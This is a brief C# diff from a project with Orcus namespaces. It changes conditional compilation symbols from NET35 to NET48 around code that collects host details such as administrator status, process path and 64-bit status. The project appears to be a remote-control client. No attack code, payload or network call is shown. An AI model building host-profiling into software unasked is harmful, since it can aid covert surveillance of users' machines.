@@ -10,7 +10,7 @@ using Orcus.Native;
 using Orcus.Service;
 using Orcus.Shared.Commands.ExceptionHandling;
 using Orcus.Shared.NetSerializer;
-#if NET35
+#if NET48
 using Orcus.Extensions;
 
 #endif
@@ -66,7 +66,7 @@ namespace Orcus.Utilities
                 IsServiceRunning = ServiceConnection.Current.IsConnected,
                 IsAdministrator = User.IsAdministrator,
                 ProcessPath = Consts.ApplicationPath,
-#if NET35
+#if NET48
                 Is64BitSystem = EnvironmentExtensions.Is64BitOperatingSystem,
                 Is64BitProcess = EnvironmentExtensions.Is64BitProcess,
 #else
